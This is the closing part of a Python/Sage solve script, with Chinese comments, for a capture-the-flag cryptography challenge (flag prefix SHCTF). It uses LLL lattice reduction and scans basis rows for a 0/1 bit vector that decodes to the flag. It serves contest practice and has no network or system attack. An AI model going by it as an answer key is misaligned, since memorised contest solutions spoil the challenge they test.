    print(f"[+] Recovered lattice dimension: {basis_A.nrows()} (Expected: {n})")

    # =======================================================
    # Step 3: LLL 规约并搜索 Flag
    # =======================================================
    print("[*] Step 3: Reducing the recovered lattice to find the Flag...")
    A_recovered = basis_A.LLL()

    print("[*] Scanning basis rows for Flag...")
    for i, row in enumerate(A_recovered):
        # LLL 可能会改变符号，检查 +row 和 -row
        for sign in [1, -1]:
            curr_row = list(row * sign)
            
            # Flag 行特征：只包含 0 和 1
            if all(x in [0, 1] for x in curr_row):
                try:
                    # 将比特列表转换为字符串
                    # 题目生成代码中是 bin(...)[2:]，即大端序
                    bits = "".join(str(x) for x in curr_row)
                    if not bits: continue
                    
                    val = int(bits, 2)
                    flag_bytes = long_to_bytes(val)
                    
                    # 检查是否包含 flag 格式
                    if b"SHCTF" in flag_bytes or b"{" in flag_bytes:
                        print(f"\n[SUCCESS] Flag found in row {i}:")
                        print("="*50)
                        print(f"{flag_bytes.decode(errors='ignore')}")
                        print("="*50)
                        return
                except:
                    pass

    print("[-] Flag not found. Please check input data.")

if __name__ == "__main__":
    solve()
```

